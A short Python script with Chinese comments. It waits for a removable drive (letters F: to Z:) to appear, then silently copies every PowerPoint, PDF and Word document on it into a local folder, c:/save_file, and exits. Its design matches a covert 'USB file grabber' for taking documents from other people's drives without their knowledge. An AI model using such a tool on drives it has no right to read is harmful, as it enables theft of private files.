import os
import sys
import shutil

# 保存的目标目录
TARGET_PATH = 'c:/save_file'
if not os.path.isdir(TARGET_PATH):
    os.mkdir(TARGET_PATH)

EXTENSION = ['.ppt', '.pptx', '.pdf', '.doc', '.docx']
# U盘可能的盘符
DRIVE = ['F:/', 'G:/', 'H:/', 'I:/', 'J:/', 'K:/', 'L:/', 'M:/', 'N:/', 'O:/', 'P:/',
         'Q:/', 'R:/', 'S:/', 'T:/', 'U:/', 'V:/', 'W:/', 'X:/', 'Y:/', 'Z:/', ]

def usb_copy(usb_path):
    usb_walk = os.walk(usb_path)            # os.walk()是目录遍历函数
    for file_walk in usb_walk:
        file_root = file_walk[0]            # 当前文件的目录
        file_files = file_walk[2]           # 当前目录内所有文件

        for file in file_files:
            file = file_root + '/' + file   # 文件名

            if os.path.splitext(file)[-1] in EXTENSION:
                # 判断是否是目标扩展名文件
                # 是则copy一份
                shutil.copy(file, TARGET_PATH)

if __name__ == '__main__':
    while True:
        for drive in DRIVE:
            if os.path.isdir(drive):
                usb_copy(drive)
                sys.exit()      # 复制完就退出了

